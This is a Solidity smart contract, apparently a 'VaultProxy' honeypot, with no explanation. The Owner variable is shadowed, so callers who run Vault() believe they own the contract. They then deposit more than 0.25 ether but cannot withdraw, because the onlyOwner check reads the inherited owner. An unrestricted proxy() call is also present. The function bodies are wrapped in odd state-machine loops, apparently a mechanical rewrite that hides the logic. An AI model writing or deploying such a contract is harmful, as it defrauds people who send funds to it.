pragma solidity ^0.4.23;

contract Proxy {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        uint8 __state = 0;
        while (true) {
            if (__state == 0) {
                if (msg.sender == tx.origin) {
                    __state = 1;
                } else {
                    break;
                }
            } else if (__state == 1) {
                Owner = msg.sender;
                __state = 2;
            } else if (__state == 2) {
                deposit();
                break;
            }
        }
    }
    
    function deposit() public payable {
        uint8 __state = 0;
        while (true) {
            if (__state == 0) {
                if (msg.value > 0.25 ether) {
                    __state = 1;
                } else {
                    break;
                }
            } else if (__state == 1) {
                Deposits[msg.sender] += msg.value;
                break;
            }
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        uint8 __state = 0;
        while (true) {
            if (__state == 0) {
                if (amount > 0 && Deposits[msg.sender] >= amount) {
                    __state = 1;
                } else {
                    break;
                }
            } else if (__state == 1) {
                msg.sender.transfer(amount);
                break;
            }
        }
    }
}